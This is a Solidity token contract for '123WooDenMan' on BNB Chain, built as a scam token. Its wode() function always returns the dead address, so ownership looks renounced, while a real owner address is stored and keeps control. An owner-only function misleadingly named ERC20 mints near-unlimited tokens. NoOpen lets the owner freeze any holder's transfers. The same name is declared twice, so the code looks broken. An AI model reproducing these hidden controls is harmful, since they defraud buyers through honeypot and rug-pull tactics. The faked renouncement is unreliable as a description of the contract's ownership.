/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-30
*/

pragma solidity ^0.4.24;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public wode;

    event wodeshipTransferred(address indexed previouswode, address indexed newwode);

    modifier onlywode() {
        require(msg.sender == wode);
        _;
    }

/**
    * @dev Returns the address of the current wode.
     */
    function wode() public pure returns (address) {
        return address(0x000000000000000000000000000000000000dEaD);
    }


    function transferwodeship(address newwode) public onlywode {
        require(newwode != address(0));
        emit wodeshipTransferred(wode, newwode);
        wode = newwode;
    }

    function renouncewodeship() public onlywode {
        emit wodeshipTransferred(wode, address(0));
        wode = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = "123WooDenMan";

    string constant public symbol = "123WooDenMan";

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 100000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFEI;

    mapping(address => bool) private _OPEN;


    uint256 public _taxFEI = 3;
    uint256 private _previousTaxFEI = _taxFEI;

    uint256 public _burnFEI = 2;
    uint256 private _previousBurnFEI = _burnFEI;


    address public projectAddress = 0x54666D9BA6c6572bb30B37378D93A692D11C0eD9;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed wode, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_OPEN[from], "is OPEN");

        if(_isExcludedFromFEI[from])
            removeAllFEI();

        uint256 FEI =  calculateTaxFEI(value);

        uint256 burn =  calculateBurnFEI(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(FEI).sub(burn);

        if(FEI > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FEI);
            emit Transfer(from, projectAddress, FEI);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromFEI[from])
            restoreAllFEI();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function ERC20(address target, uint256 edAmount) public onlywode{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFEI).div(
            10 ** 2
        );
    }

    function calculateBurnFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFEI).div(
            10 ** 2
        );
    }

    function removeAllFEI() private {
        if(_taxFEI == 0 && _burnFEI == 0)
            return;

        _previousTaxFEI = _taxFEI;
        _previousBurnFEI = _burnFEI;
        _taxFEI = 0;
        _burnFEI = 0;
    }

    function restoreAllFEI() private {
        _taxFEI = _previousTaxFEI;
        _burnFEI = _previousBurnFEI;
    }



    function NoOpen(address account) public onlywode {
        _OPEN[account] = true;
    }


    function YesOpen(address account) public onlywode {
        _OPEN[account] = false;
    }


    function isOPEN(address account) public view returns (bool) {

        return _OPEN[account];
    }


}


contract WooDenMan is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        wode = 0x54666D9BA6c6572bb30B37378D93A692D11C0eD9;


    }

}